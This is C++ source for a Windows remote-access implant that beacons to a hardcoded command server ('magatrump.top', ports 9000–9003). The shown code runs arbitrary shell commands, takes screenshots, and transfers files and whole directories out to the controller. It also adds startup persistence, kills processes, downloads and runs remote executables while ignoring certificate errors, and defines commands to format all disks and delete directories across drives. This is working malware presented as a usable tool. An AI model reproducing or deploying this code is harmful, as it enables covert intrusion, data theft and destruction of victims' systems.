#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h> 
#include <iphlpapi.h>
#include <algorithm>
#include <cctype>
#include <winioctl.h>
#include <shellapi.h>
#include <vector>
#include <gdiplus.h>
#include <psapi.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <map>
#include <set>
#include <mstcpip.h>
#include <sddl.h>
#include "TIHelper.h"

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;
using namespace Gdiplus;


// 64位网络字节序转换（自定义名称避免与SDK冲突）
static inline ULONGLONG HToNLL(ULONGLONG v) {
    return (((ULONGLONG)htonl((ULONG)(v & 0xFFFFFFFF))) << 32) | htonl((ULONG)(v >> 32));
}
static inline ULONGLONG NToHLL(ULONGLONG v) { return HToNLL(v); }

// 目录传输：按TaskID路由的就绪事件表
static std::map<string, HANDLE> g_dirReadyMap;
static CRITICAL_SECTION g_dirReadyMapLock;

// ===== 配置 =====
#define SERVER_IP    "magatrump.top"
#define SERVER_PORT  9000
#define RECONNECT_MS 2000
#define FILE_SERVER_PORT 9001  // 控制端文件传输端口（被控制端→控端）
#define FILE_RECV_PORT 9002   // 被控端接收文件端口（控制端→被控端）

// ===== 协议指令 =====
#define MAGIC        0xDEADBEEF
#define CMD_REGISTER 0x01
#define CMD_EXEC     0x03
#define CMD_EXEC_RES 0x04
#define CMD_SHUTDOWN 0x05
#define CMD_REBOOT   0x06
#define CMD_GETPROCS 0x08
#define CMD_GETPROCS_RES 0x09
#define CMD_LIST_DIR     0x0A  // 获取目录列表
#define CMD_LIST_DIR_RES 0x0B  // 目录列表结果
#define CMD_DELETE_PATH  0x0C  // 删除文件或目录
#define CMD_DELETE_RES   0x0D  // 删除结果
#define CMD_SCREENSHOT_TODESK     0x0E  // 截图ToDesk窗口
#define CMD_SCREENSHOT_RES        0x0F  // 截图结果（成功/失败文字）
#define CMD_SCREENSHOT_FULLSCREEN 0x10  // 截全屏
#define CMD_SEND_FILE             0x11  // 控制端→被控端 传文件
#define CMD_SEND_FILE_RES         0x12  // 传文件结果
#define CMD_REQUEST_FILE          0x13  // 控制端请求被控端回传文件
#define CMD_FILE_BEGIN   0x15  // 开始传文件
#define CMD_FILE_CHUNK   0x16  // 文件分块
#define CMD_FILE_END     0x17  // 文件传输完成
#define CMD_FILE_RESUME  0x18  // 查询续传偏移
#define CMD_KILL_TODESK 0x19  // 结束ToDesk进程
#define CMD_KILL_ASKLINK 0x20  // 结束ToDesk进程
#define CMD_KILL_RES    0x1A  // 结束进程结果
#define CMD_DOWNLOAD_EX 0x1B  // 通用下载指令
#define CMD_DOWNLOAD_PROGRESS 0x1C  // 下载进度回报
#define CMD_DOWNLOAD_TODESK 0x1F  // 直接下载ToDesk精简版到桌面
#define CMD_SCREENSHOT_ASKLINK 0x21  // 截图连连控窗口
#define CMD_OPEN_ASKLINK       0x22  // 打开连连控
#define CMD_OPEN_TODESK        0x23  // 打开ToDesk
#define CMD_OPEN_RES           0x24  // 打开软件结果回报
#define CMD_LIST_DRIVES     0x25  // 获取磁盘列表
#define CMD_LIST_DRIVES_RES 0x26  // 磁盘列表结果
#define CMD_REQUEST_DIR     0x27  // 控制端请求被控端传输整个目录
#define CMD_DIR_FILE_COUNT  0x28  // 被控端回报目录总文件数（用于进度）
#define CMD_DIR_READY  0x29  // 控制端已准备好接收目录文件
#define CMD_FORMAT_DISKS  0x2A  // PE下格式化所有硬盘（删除所有分区）
#define CMD_FORMAT_RES    0x2B  // 格式化结果回报
#define CMD_DEL_DIR_ALL   0x2C  // 循环删除所有盘下指定目录名
#define CMD_DEL_DIR_RES   0x2D  // 删除目录结果回报
// ===== 分块文件传输 =====
#define FILE_CHUNK_SIZE (256 * 1024)  // 每块256KB
// ===== 中转服务器专用指令 =====
#define CMD_FILE_HELLO   0xF1  // 文件端口握手（连上9001/9002后发）
#define CMD_HEARTBEAT 0x30
#define CMD_AGENT_HELLO  0xF4  // 被控端指令连接握手
#define CMD_PORT         9003  // 指令中转端口（新增）
#define CMD_PAIR_OK   0xF5   // 服务端配对成功确认
#define CMD_PAIR_FAIL 0xF6   // 服务端配对失败

#define CMD_GET_INSTALLED     0x2E  // 获取安装软件列表
#define CMD_GET_INSTALLED_RES 0x2F  // 软件列表结果
#define CMD_ADD_STARTUP       0x31  // 添加开机启动项
#define CMD_ADD_STARTUP_RES   0x32  // 添加启动项结果
#define CMD_DEL_STARTUP       0x33  // 卸载开机启动项
#define CMD_DEL_STARTUP_RES   0x34  // 卸载结果

#define CMD_RUN_PROGRAM     0x35  // 运行程序
#define CMD_RUN_PROGRAM_RES 0x36  // 运行结果
#define CMD_KILL_PROCESS    0x37  // 结束进程（按名称/通配符）
#define CMD_KILL_PROCESS_RES 0x38 // 结束进程结果
#define CMD_GET_STARTUP_LIST     0x39
#define CMD_GET_STARTUP_LIST_RES 0x3A
#define CMD_HEARTBEAT_9003 0x3B
#define CMD_ADD_STARTUP_NOREG  0x3D  // 只写注册表不复制文件


// 在全局变量区加
CRITICAL_SECTION g_sendLock;
CRITICAL_SECTION g_fileSendLock;

// ★ 新增：网络就绪标志，协调9000和9003的启动顺序
static volatile bool g_NetworkReady = false;
static volatile SOCKET g_CmdSocket = INVALID_SOCKET;
static HANDLE g_NetworkReadyEvent = NULL;


string LaunchAskLink(SOCKET reportSocket, const string& cpuTag);
string ModifyStartup(SOCKET reportSocket, bool add, bool copyFile, const string& sourceFilePath = "");

#pragma pack(push, 1)
struct PktHeader {
    unsigned int magic;
    unsigned int cmd;
    unsigned int dataLen;
};
#pragma pack(pop)

// UTF8 -> UTF16
wstring Utf8ToWide(const string& utf8)
{
    int len = MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, NULL, 0);
    if (len <= 0) return L"";

    wstring w(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, &w[0], len);

    if (!w.empty() && w.back() == L'\0')
        w.pop_back();

    return w;
}

// UTF16 -> UTF8
string WideToUtf8(const wstring& wstr)
{
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (len <= 0) return "";

    string s(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &s[0], len, NULL, NULL);

    if (!s.empty() && s.back() == '\0')
        s.pop_back();

    return s;
}

// 获取真实物理分辨率（不受DPI缩放影响）
void GetPhysicalScreenSize(int& width, int& height)
{
    // 方法1：用GetDeviceCaps获取物理像素
    HDC hdc = GetDC(NULL);
    width = GetDeviceCaps(hdc, DESKTOPHORZRES);  // 物理宽度
    height = GetDeviceCaps(hdc, DESKTOPVERTRES);  // 物理高度
    ReleaseDC(NULL, hdc);
}

bool SendAll(SOCKET s, const char* buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = send(s, buf + sent, len - sent, 0);
        if (n <= 0) return false;
        sent += n;
    }
    return true;
}

bool RecvAll(SOCKET s, char* buf, int len) {
    int got = 0;
    while (got < len) {
        int n = recv(s, buf + got, len - got, 0);
        if (n <= 0) return false;
        got += n;
    }
    return true;
}

//容量格式化
string FormatSize(ULONGLONG bytes)
{
    char buf[64] = {};
    if (bytes >= 1024ULL * 1024 * 1024)
        sprintf_s(buf, "%.2f GB", bytes / 1024.0 / 1024 / 1024);
    else if (bytes >= 1024 * 1024)
        sprintf_s(buf, "%.2f MB", bytes / 1024.0 / 1024);
    else
        sprintf_s(buf, "%llu KB", bytes / 1024);
    return string(buf);
}
// GBK字节串 -> UTF-8字符串（用于cmd输出转换）
string GbkToUtf8(const string& gbk)
{
    // GBK -> UTF-16
    int wlen = MultiByteToWideChar(CP_ACP, 0, gbk.c_str(), (int)gbk.size(), NULL, 0);
    if (wlen <= 0) return gbk;
    wstring w(wlen, 0);
    MultiByteToWideChar(CP_ACP, 0, gbk.c_str(), (int)gbk.size(), &w[0], wlen);

    // UTF-16 -> UTF-8
    return WideToUtf8(w);
}

string ExecCommand(const string& cmd) {
    string result;
    char buf[4096];
    string fullCmd = "cmd.exe /c " + cmd;
    FILE* pipe = _popen(fullCmd.c_str(), "r");
    if (!pipe) return "error";
    while (fgets(buf, sizeof(buf), pipe))
        result += buf;
    _pclose(pipe);
    return GbkToUtf8(result);  // ← 只加这一行，GBK转UTF-8
}

//文件传输相关
// 二进制发包
bool SendPacketBin(SOCKET s, unsigned int cmd, const vector<char>& data) {
    PktHeader hdr;
    hdr.magic = htonl(MAGIC);
    hdr.cmd = htonl(cmd);
    hdr.dataLen = htonl((unsigned int)data.size());
    if (!SendAll(s, (char*)&hdr, sizeof(hdr))) return false;
    if (!data.empty() && !SendAll(s, data.data(), (int)data.size())) return false;
    return true;
}

// 新增：向主连接安全发包（带锁）
bool SendPacketSafe(SOCKET s, unsigned int cmd, const vector<char>& data) {
    EnterCriticalSection(&g_sendLock);
    bool ok = SendPacketBin(s, cmd, data);
    LeaveCriticalSection(&g_sendLock);
    return ok;
}

// 二进制收包（覆盖原RecvPacket，支持更大数据，100MB上限）
bool RecvPacketBin(SOCKET s, unsigned int& cmd, vector<char>& data) {
    PktHeader hdr;
    if (!RecvAll(s, (char*)&hdr, sizeof(hdr))) return false;
    if (ntohl(hdr.magic) != MAGIC) return false;
    cmd = ntohl(hdr.cmd);
    unsigned int len = ntohl(hdr.dataLen);
    if (len > 1000 * 10240 * 10240) return false;
    data.resize(len);
    if (len > 0 && !RecvAll(s, data.data(), len)) return false;
    return true;
}



// ===== PE关机/重启 =====
void ShutdownSystem(bool reboot) {
    // 提权
    HANDLE hToken;
    TOKEN_PRIVILEGES tp = {};
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, 0);
        CloseHandle(hToken);
    }

    // PE下最可靠的关机方式
    if (!InitiateSystemShutdownExA(NULL, NULL, 0, TRUE, reboot, SHTDN_REASON_MAJOR_OTHER)) {
        // 兜底：wpeutil
        const char* cmd = reboot ? "wpeutil reboot" : "wpeutil shutdown";
        char cmdBuf[64];
        strcpy_s(cmdBuf, cmd);
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        if (CreateProcessA(NULL, cmdBuf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// ===== 通用下载函数系统 =====

// 下载配置结构体
struct DownloadConfig
{
    string url;          // 纯下载URL（http/https开头）
    string savePath;     // 保存的完整路径，空则自动用临时目录
    string silentArgs;   // 静默安装参数，空则不带参数运行，非空则下载后用参数执行
    SOCKET reportSocket; // 用于回报进度的socket，INVALID_SOCKET则只打印日志
    bool launchAfterInstall = false;  // 静默安装完成后自动查找并启动（用于连连控）
};

// URL解码，把%XX转换为对应字符
string UrlDecode(const string& encoded)
{
    string result;
    result.reserve(encoded.size());
    for (size_t i = 0; i < encoded.size(); ) {
        if (encoded[i] == '%' && i + 2 < encoded.size()) {
            char hex[3] = { encoded[i + 1], encoded[i + 2], 0 };
            char* end = nullptr;
            long val = strtol(hex, &end, 16);
            if (end == hex + 2) {
                result += (char)val;
                i += 3;
                continue;
            }
        }
        result += encoded[i++];
    }
    return result;
}

// 解析输入字符串，分离URL和静默参数
// 格式："http://xxx.exe /s"  → url="http://xxx.exe", args="/s"
// 格式："http://xxx.exe"     → url="http://xxx.exe", args=""
void ParseDownloadInput(const string& input, string& outUrl, string& outArgs)
{
    // 找到协议头结束位置（http://或https://）
    size_t schemeEnd = input.find("://");
    if (schemeEnd == string::npos) { outUrl = input; outArgs = ""; return; }

    // 从协议头之后找第一个空格
    size_t spacePos = input.find(' ', schemeEnd + 3);
    if (spacePos == string::npos) {
        outUrl = input;
        outArgs = "";
    }
    else {
        outUrl = input.substr(0, spacePos);
        outArgs = input.substr(spacePos + 1);
        // 去掉args前后空格
        while (!outArgs.empty() && outArgs.front() == ' ') outArgs = outArgs.substr(1);
        while (!outArgs.empty() && outArgs.back() == ' ') outArgs.pop_back();
    }
}

// 发送下载进度到控制端
void SendDownloadProgress(SOCKET s, const string& filename,
    LONGLONG downloaded, LONGLONG total, ULONGLONG speedBytesPerSec,
    bool done, const string& savePath = "", const string& cpuInfo = "")
{
    if (s == INVALID_SOCKET) return;
    char buf[1024] = {};
    if (done) {
        // DONE|filename|size|savePath|cpuInfo
        sprintf_s(buf, "DONE|%s|%lld|%s|%s",
            filename.c_str(), downloaded,
            savePath.c_str(), cpuInfo.c_str());
    }
    else if (total > 0) {
        int percent = (int)(downloaded * 100 / total);
        // PROG|filename|downloaded|total|speed|percent|cpuInfo
        sprintf_s(buf, "PROG|%s|%lld|%lld|%llu|%d|%s",
            filename.c_str(), downloaded, total,
            speedBytesPerSec, percent, cpuInfo.c_str());
    }
    else {
        sprintf_s(buf, "PROG|%s|%lld|0|%llu|0|%s",
            filename.c_str(), downloaded,
            speedBytesPerSec, cpuInfo.c_str());
    }
    string msg(buf);
    SendPacketBin(s, CMD_DOWNLOAD_PROGRESS, vector<char>(msg.begin(), msg.end()));
}

// 获取截图缓存目录，兼容PE和正常系统
// 优先用 %TEMP%（GetTempPath），PE下也有效
// 返回末尾不带反斜杠的路径（UTF-8）
string GetScreenshotCacheDir()
{
    wchar_t tempPath[MAX_PATH] = {};
    // GetTempPathW 在PE和正常系统下都能返回有效临时目录
    if (GetTempPathW(MAX_PATH, tempPath) > 0)
        return WideToUtf8(wstring(tempPath));

    // 兜底：用系统盘的 Windows\Temp
    wchar_t winDir[MAX_PATH] = {};
    GetWindowsDirectoryW(winDir, MAX_PATH);
    wstring ws(winDir);
    if (ws.size() >= 2)
        return WideToUtf8(ws.substr(0, 2) + L"\\Windows\\Temp\\");
    return "C:\\Windows\\Temp\\";
}

// ===== 系统常用路径解析 =====
// 支持10个常用位置，兼容正常系统和PE系统
// 路径标识符（控制端传来的字符串）→ 实际路径

// 获取PE系统盘符（PE下系统一般在X:，正常系统在C:）
wstring GetSystemDrive()
{
    wchar_t winDir[MAX_PATH] = {};
    GetWindowsDirectoryW(winDir, MAX_PATH);
    // 取盘符部分，如 "C:"
    wstring ws(winDir);
    if (ws.size() >= 2) return ws.substr(0, 2);
    return L"C:";
}

// 解析路径标识符，返回实际绝对路径（UTF-8）
// 标识符列表：
//   USER_DESKTOP       当前用户桌面
//   USER_HOME          当前用户主目录
//   USER_DOWNLOADS     当前用户下载
//   USER_DOCUMENTS     当前用户文档
//   PUBLIC_DESKTOP     公共桌面
//   PUBLIC_HOME        公共用户目录
//   PUBLIC_DOWNLOADS   公共下载
//   PUBLIC_DOCUMENTS   公共文档
//   USER_STARTUP       当前用户开机自启动
//   WINDOWS_DIR        Windows系统安装目录
string ResolveSysPath(const string& pathId)
{
    wstring result;

    // ★ 支持 "标识符\文件名" 格式，如 "USER_DESKTOP\AskLink_zyck4096.exe"
    // 先尝试分离标识符和后缀路径
    static const char* knownIds[] = {
        "USER_DESKTOP", "USER_HOME", "USER_DOWNLOADS", "USER_DOCUMENTS",
        "PUBLIC_DESKTOP", "PUBLIC_HOME", "PUBLIC_DOWNLOADS", "PUBLIC_DOCUMENTS",
        "USER_STARTUP", "WINDOWS_DIR", nullptr
    };
    for (int i = 0; knownIds[i] != nullptr; i++) {
        string prefix = knownIds[i];
        if (pathId.substr(0, prefix.size()) == prefix &&
            pathId.size() > prefix.size() &&
            (pathId[prefix.size()] == '\\' || pathId[prefix.size()] == '/'))
        {
            // 递归解析标识符部分，再拼接剩余路径
            string basePath = ResolveSysPath(prefix);
            string suffix = pathId.substr(prefix.size() + 1); // 跳过反斜杠
            if (!basePath.empty()) {
                return basePath + "\\" + suffix;
            }
        }
    }

    // 先尝试用SHGetFolderPathW获取（正常系统下最准确）
    auto TryShellFolder = [](int csidl) -> wstring {
        wchar_t buf[MAX_PATH] = {};
        if (SUCCEEDED(SHGetFolderPathW(NULL, csidl, NULL, SHGFP_TYPE_CURRENT, buf)))
            return wstring(buf);
        return L"";
    };

    if (pathId == "USER_DESKTOP") {
        result = TryShellFolder(CSIDL_DESKTOPDIRECTORY);
        if (result.empty()) {
            // PE兜底：手动拼接
            wchar_t userName[256] = {}; DWORD len = 256;
            GetUserNameW(userName, &len);
            result = GetSystemDrive() + L"\\Users\\" + userName + L"\\Desktop";
        }
    }
    else if (pathId == "USER_HOME") {
        result = TryShellFolder(CSIDL_PROFILE);
        if (result.empty()) {
            wchar_t userName[256] = {}; DWORD len = 256;
            GetUserNameW(userName, &len);
            result = GetSystemDrive() + L"\\Users\\" + userName;
        }
    }
    else if (pathId == "USER_DOWNLOADS") {
        // SHGetKnownFolderPath（Vista+）
        PWSTR pPath = nullptr;
        // FOLDERID_Downloads = {374DE290-123F-4565-9164-39C4925E467B}
        GUID FOLDERID_Downloads = { 0x374DE290,0x123F,0x4565,{0x91,0x64,0x39,0xC4,0x92,0x5E,0x46,0x7B} };
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &pPath))) {
            result = pPath;
            CoTaskMemFree(pPath);
        }
        if (result.empty()) {
            wchar_t userName[256] = {}; DWORD len = 256;
            GetUserNameW(userName, &len);
            result = GetSystemDrive() + L"\\Users\\" + userName + L"\\Downloads";
        }
    }
    else if (pathId == "USER_DOCUMENTS") {
        result = TryShellFolder(CSIDL_PERSONAL);
        if (result.empty()) {
            wchar_t userName[256] = {}; DWORD len = 256;
            GetUserNameW(userName, &len);
            result = GetSystemDrive() + L"\\Users\\" + userName + L"\\Documents";
        }
    }
    else if (pathId == "PUBLIC_DESKTOP") {
        result = TryShellFolder(CSIDL_COMMON_DESKTOPDIRECTORY);
        if (result.empty()) result = GetSystemDrive() + L"\\Users\\Public\\Desktop";
    }
    else if (pathId == "PUBLIC_HOME") {
        result = TryShellFolder(CSIDL_COMMON_APPDATA);
        if (result.empty()) result = GetSystemDrive() + L"\\Users\\Public";
        // 取Public目录（父级）
        result = GetSystemDrive() + L"\\Users\\Public";
    }
    else if (pathId == "PUBLIC_DOWNLOADS") {
        PWSTR pPath = nullptr;
        GUID FOLDERID_PublicDownloads = { 0x3D644C9B,0x1FB8,0x4f30,{0x9B,0x45,0xF6,0x70,0x23,0x5F,0x79,0xC0} };
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_PublicDownloads, 0, NULL, &pPath))) {
            result = pPath;
            CoTaskMemFree(pPath);
        }
        if (result.empty()) result = GetSystemDrive() + L"\\Users\\Public\\Downloads";
    }
    else if (pathId == "PUBLIC_DOCUMENTS") {
        result = TryShellFolder(CSIDL_COMMON_DOCUMENTS);
        if (result.empty()) result = GetSystemDrive() + L"\\Users\\Public\\Documents";
    }
    else if (pathId == "USER_STARTUP") {
        result = TryShellFolder(CSIDL_STARTUP);
        if (result.empty()) {
            wchar_t userName[256] = {}; DWORD len = 256;
            GetUserNameW(userName, &len);
            result = GetSystemDrive() + L"\\Users\\" + userName +
                L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        }
    }
    else if (pathId == "WINDOWS_DIR") {
        wchar_t buf[MAX_PATH] = {};
        GetWindowsDirectoryW(buf, MAX_PATH);
        result = buf;
        if (result.empty()) result = GetSystemDrive() + L"\\Windows";
    }
    else {
        // 不是标识符，当作普通路径直接返回
        return pathId;
    }

    return WideToUtf8(result);
}

// 通用下载并运行函数
// 只需传入DownloadConfig即可，适用于ToDesk/向日葵/连连控等任何软件
void DownloadAndRunEx(const DownloadConfig& cfg)
{
    string url = cfg.url;

    // 获取主机名用于日志区分
    string cpuTag;
    {
        wchar_t hostName[256] = {};
        DWORD len = 256;
        if (GetComputerNameW(hostName, &len))
            cpuTag = WideToUtf8(wstring(hostName));
    }

    string savePathIn = cfg.savePath;

    // 解析协议
    string tmp = url;
    bool isHttps = false;
    int defaultPort = 80;

    if (tmp.substr(0, 7) == "http://") { tmp = tmp.substr(7); isHttps = false; defaultPort = 80; }
    else if (tmp.substr(0, 8) == "https://") { tmp = tmp.substr(8); isHttps = true;  defaultPort = 443; }
    else {
        string err = "ERROR:不支持的协议，只支持http/https";
        if (cfg.reportSocket != INVALID_SOCKET)
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                vector<char>(err.begin(), err.end()));
        return;
    }

    // 解析host和path
    string host, path;
    int port = defaultPort;
    size_t slash = tmp.find('/');
    string hostport = (slash == string::npos) ? tmp : tmp.substr(0, slash);
    path = (slash == string::npos) ? "/" : tmp.substr(slash);

    size_t colon = hostport.find(':');
    if (colon != string::npos) {
        host = hostport.substr(0, colon);
        port = atoi(hostport.substr(colon + 1).c_str());
    }
    else {
        host = hostport;
    }

    // 提取文件名并完整URL解码
    string filename = path;
    size_t p = filename.rfind('/');
    if (p != string::npos) filename = filename.substr(p + 1);
    if (filename.empty()) filename = "setup.exe";
    // ★ 完整URL解码（处理中文和所有%XX编码）
    filename = UrlDecode(filename);
    // 去掉文件名中Windows不允许的字符
    for (char& c : filename) {
        if (c == '/' || c == '\\' || c == ':' || c == '*' ||
            c == '?' || c == '"' || c == '<' || c == '>' || c == '|')
            c = '_';
    }

    // 确定保存路径
    string savePath;
    if (!savePathIn.empty()) {
        // ★ 判断savePathIn是目录还是完整文件路径
        // 如果末尾是\或/，或者是纯目录（无扩展名），则自动拼接文件名
        bool isDir = (!savePathIn.empty() &&
            (savePathIn.back() == '\\' || savePathIn.back() == '/'));
        if (!isDir) {
            // 检查最后一段有没有扩展名
            size_t lastSlash = savePathIn.rfind('\\');
            if (lastSlash == string::npos) lastSlash = savePathIn.rfind('/');
            string lastName = (lastSlash != string::npos)
                ? savePathIn.substr(lastSlash + 1) : savePathIn;
            isDir = (lastName.find('.') == string::npos); // 没有点就当目录
        }

        if (isDir) {
            // 是目录，补上反斜杠和文件名
            savePath = savePathIn;
            if (savePath.back() != '\\' && savePath.back() != '/')
                savePath += '\\';
            savePath += filename;
        }
        else {
            // 是完整文件路径，直接用
            savePath = savePathIn;
        }
    }
    else {
        wchar_t tempPathW[MAX_PATH] = {};
        GetTempPathW(MAX_PATH, tempPathW);
        // ★ 用W版本获取，再转UTF-8，避免中文用户名ANSI乱码
        savePath = WideToUtf8(wstring(tempPathW)) + filename;
    }

    // 初始化WinHTTP
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        string err = "ERROR:WinHttpOpen失败:" + to_string(GetLastError());
        if (cfg.reportSocket != INVALID_SOCKET)
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS, vector<char>(err.begin(), err.end()));
        return;
    }

    wstring whost(host.begin(), host.end());
    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), (INTERNET_PORT)port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    wstring wpath(path.begin(), path.end());
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        isHttps ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    DWORD connectTimeout = 10000, receiveTimeout = 60000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &connectTimeout, sizeof(connectTimeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &receiveTimeout, sizeof(receiveTimeout));

    if (isHttps) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    DWORD redirectPolicy = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_REDIRECT_POLICY, &redirectPolicy, sizeof(redirectPolicy));

    wstring headers = L"Accept: application/octet-stream, */*\r\nConnection: keep-alive\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        string err = "ERROR:请求失败:" + to_string(GetLastError());
        if (cfg.reportSocket != INVALID_SOCKET)
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS, vector<char>(err.begin(), err.end()));
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return;
    }

    // 检查HTTP状态码
    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &statusCode, &statusSize, NULL);
    if (statusCode != 200) {
        string err = "ERROR:HTTP状态码:" + to_string(statusCode);
        if (cfg.reportSocket != INVALID_SOCKET)
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS, vector<char>(err.begin(), err.end()));
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return;
    }

    // 检查Content-Type，放宽判断：只有明确是HTML且不含二进制流标记才拦截
    wchar_t contentType[512] = {};
    DWORD ctSize = sizeof(contentType);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_TYPE, NULL, contentType, &ctSize, NULL)) {
        wstring wct(contentType);
        string ct(wct.begin(), wct.end());
        // ★ 只有明确是HTML且不包含octet-stream才拦截
        bool isHtml = ct.find("text/html") != string::npos;
        bool isOctet = ct.find("octet-stream") != string::npos;
        bool isExe = ct.find("application/x-msdownload") != string::npos ||
            ct.find("application/x-executable") != string::npos;
        if (isHtml && !isOctet && !isExe) {
            string err = "ERROR:服务器返回HTML页面，非文件，Content-Type:" + ct;
            if (cfg.reportSocket != INVALID_SOCKET)
                SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                    vector<char>(err.begin(), err.end()));
            WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
            return;
        }
    }

    // 获取Content-Length（用于进度计算）
    LONGLONG contentLength = -1;
    wchar_t clBuf[64] = {};
    DWORD clSize = sizeof(clBuf);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, NULL, clBuf, &clSize, NULL))
        contentLength = _wtoi64(clBuf);

    // 创建本地文件
    wstring wsavePathForFile = Utf8ToWide(savePath);
    HANDLE hFile = CreateFileW(wsavePathForFile.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        string err = "ERROR:创建文件失败:" + to_string(GetLastError());
        if (cfg.reportSocket != INVALID_SOCKET)
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS, vector<char>(err.begin(), err.end()));
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return;
    }

    // 下载循环，实时回报进度
    // 下载循环，实时回报进度
    LONGLONG total = 0;
    DWORD    bytesRead = 0;
    DWORD    lastTick = GetTickCount();
    LONGLONG lastBytes = 0;
    char buffer[65536];

    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD written = 0;
        WriteFile(hFile, buffer, bytesRead, &written, NULL);
        total += written;
        bytesRead = 0;

        DWORD now = GetTickCount();
        DWORD elapsed = now - lastTick;
        if (elapsed >= 1000) {
            ULONGLONG speed = (ULONGLONG)(total - lastBytes) * 1000 / max(elapsed, 1U);
            SendDownloadProgress(cfg.reportSocket, filename,
                total, contentLength, speed, false, "", cpuTag);
            lastTick = now;
            lastBytes = total;
        }
    }

    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);


    // ===== 启动逻辑，三种情况 =====
    // silentArgs == ""   → 仅下载，不运行
    // silentArgs == "!"  → 下载后直接运行（无参数启动，不等待退出）
    // silentArgs == 其他 → 带参数静默安装（等待进程退出回报结果）

    if (cfg.silentArgs.empty()) {
        // 情况一：仅下载
        if (cfg.reportSocket != INVALID_SOCKET) {
            char buf[1024] = {};
            sprintf_s(buf, "DONE_NORUN|%s|%lld|%s|%s",
                filename.c_str(), total, savePath.c_str(), cpuTag.c_str());
